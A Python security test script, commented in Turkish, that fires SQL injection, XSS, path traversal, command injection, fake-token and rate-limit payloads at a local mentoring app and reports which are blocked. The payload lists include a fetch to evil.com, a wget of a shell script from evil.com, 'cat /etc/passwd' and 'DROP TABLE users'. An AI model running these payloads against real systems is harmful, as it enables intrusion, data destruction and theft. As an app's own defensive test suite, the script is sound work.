import requests, sys, time
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
BASE = 'http://127.0.0.1:8000/api'

ok = 0; fail = 0; total = 0

def check(label, cond, got=None):
    global ok, fail, total
    total += 1
    if cond:
        ok += 1
        print(f'  [ENGELLENDI] {label}')
    else:
        fail += 1
        print(f'  [GECTI!!!!] {label}  <- HTTP {got}')

tok = requests.post(BASE+'/auth/login/', json={'username':'ahmet_yilmaz','password':'mentor1234'}, timeout=5).json().get('access','')
H  = {'Authorization':'Bearer '+tok, 'Content-Type':'application/json'}
HA = {'Content-Type':'application/json'}

print()
print('='*50)
print('  MENTONNECT GUVENLIK SALDIRI TESTLERI')
print('='*50)

# ── 1. SQL INJECTION ─────────────────────────────────
print()
print('[1] SQL INJECTION')
sqli_payloads = [
    "' OR '1'='1",
    "admin' --",
    "1 UNION SELECT * FROM users--",
    "; DROP TABLE users--",
    "1 AND SLEEP(5)--",
    "' OR 1=1--",
    "1; SELECT * FROM information_schema",
    '" OR ""="',
    "1' AND '1'='1",
]
for p in sqli_payloads:
    r = requests.post(BASE+'/auth/login/', json={'username': p, 'password':'x'}, timeout=5)
    check(f'SQLi login: {p[:38]}', r.status_code in [400, 401])

# ── 2. XSS ───────────────────────────────────────────
print()
print('[2] XSS SALDIRISI')
xss_payloads = [
    '<script>alert(document.cookie)</script>',
    '<img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    '<svg onload=alert(1)>',
    '<iframe src=javascript:alert(1)>',
    '<body onload=alert(1)>',
    '<script>fetch("http://evil.com")</script>',
    '<<SCRIPT>alert("XSS");//<</SCRIPT>',
]
for p in xss_payloads:
    r = requests.post(BASE+'/messages/', json={'receiver':2, 'content': p}, headers=H, timeout=5)
    check(f'XSS mesaj: {p[:42]}', r.status_code == 400)

r2 = requests.post(BASE+'/auth/register/', json={
    'username':'xss_atk99','email':'xssatk99@test.com',
    'password':'Test1234!','role':'student',
    'first_name':'<script>alert(1)</script>','last_name':'Test'
}, timeout=5)
check('XSS kayit first_name', r2.status_code == 400)
if r2.status_code == 201:
    requests.delete(BASE+f'/auth/admin/users/{r2.json()["id"]}/', headers=H, timeout=5)

r3 = requests.post(BASE+'/reviews/', json={'mentor':1,'rating':5,'comment':'<script>alert(1)</script>'}, headers=H, timeout=5)
check('XSS yorum comment', r3.status_code == 400)

# ── 3. PATH TRAVERSAL ────────────────────────────────
print()
print('[3] PATH TRAVERSAL')
traversal_payloads = [
    '../../etc/passwd',
    '/etc/passwd',
    '....//....//etc/passwd',
    'C:\\Windows\\System32\\drivers\\etc\\hosts',
    '..%2F..%2Fetc%2Fshadow',
]
for p in traversal_payloads:
    r = requests.post(BASE+'/messages/', json={'receiver':2,'content':p}, headers=H, timeout=5)
    check(f'Path traversal: {p[:40]}', r.status_code == 400)

# ── 4. KOMUT INJECTION ───────────────────────────────
print()
print('[4] KOMUT INJECTION')
cmd_payloads = [
    '; ls -la /etc',
    '| cat /etc/passwd',
    '&& wget http://evil.com/shell.sh',
    '`whoami`',
    '; python -c import os',
]
for p in cmd_payloads:
    r = requests.post(BASE+'/messages/', json={'receiver':2,'content':p}, headers=H, timeout=5)
    check(f'Cmd injection: {p[:38]}', r.status_code == 400)

# ── 5. ASIRI BUYUK PAYLOAD ───────────────────────────
print()
print('[5] ASIRI BUYUK PAYLOAD')
r = requests.post(BASE+'/messages/', json={'receiver':2,'content':'A'*600000}, headers=H, timeout=10)
check('600KB icerik alani', r.status_code == 400)

big_body = {'receiver':2}
big_body.update({f'field_{i}': 'x'*1000 for i in range(600)})
r2 = requests.post(BASE+'/messages/', json=big_body, headers=H, timeout=10)
check('600KB toplam JSON body', r2.status_code in [400, 413])

# ── 6. KIMLIK DOGRULAMA ATLAMA ───────────────────────
print()
print('[6] KIMLIK DOGRULAMA ATLAMA')
unauth = [
    ('GET', '/auth/admin/users/', [401,403]),
    ('GET', '/auth/admin/logs/',  [401,403]),
    ('GET', '/lessons/',          [401,403]),
    ('GET', '/messages/',         [401,403]),
    ('GET', '/verification/',     [401,403]),
    ('GET', '/auth/admin/settings/', [200]),  # kasitli AllowAny GET
]
for method, ep, expected in unauth:
    fn = getattr(requests, method.lower())
    r = fn(BASE+ep, headers=HA, timeout=5)
    check(f'Yetkisiz erisim [{method}] {ep}', r.status_code in expected, r.status_code)

# ── 7. SAHTE TOKEN ───────────────────────────────────
print()
print('[7] SAHTE / BOZUK TOKEN')
fake_tokens = [
    'fake.token.here',
    'eyJhbGciOiJIUzI1NiJ9.fake.sig',
    'null',
    'admin',
    tok[:-8] + 'XXXXXXXX',
]
for ft in fake_tokens:
    h = {'Authorization': 'Bearer '+ft, 'Content-Type':'application/json'}
    r = requests.get(BASE+'/auth/me/', headers=h, timeout=5)
    check(f'Sahte token: {ft[:30]}', r.status_code in [401, 403])

# ── 8. RATE LIMIT ────────────────────────────────────
print()
print('[8] RATE LIMIT (125 hizli istek)')
rate_hit = False
for i in range(125):
    r = requests.get(BASE+'/mentors/', timeout=3)
    if r.status_code == 429:
        rate_hit = True
        check(f'Rate limit {i+1}. istekte devreye girdi', True)
        break
if not rate_hit:
    check('Rate limit 125 istek icinde', False, 'Tetiklenmedi')

# ── 9. NULL BYTE ─────────────────────────────────────
print()
print('[9] NULL BYTE INJECTION')
null_payload = 'test' + chr(0) + 'injection'
r = requests.post(BASE+'/messages/', json={'receiver':2,'content': null_payload}, headers=H, timeout=5)
# 400 = engellendi, 429 = rate limit (yine engellendi sayilir)
check('Null byte injeksiyonu', r.status_code in [400, 429], r.status_code)

# ── SONUC ─────────────────────────────────────────────
print()
print('='*50)
print(f'  SONUC: {ok}/{total} ENGELLENDI  |  {fail} GECTI')
if fail == 0:
    print('  TUM SALDIRILAR BASARIYLA ENGELLENDI!')
else:
    print(f'  DIKKAT: {fail} saldiri engellenmedi!')
print('='*50)
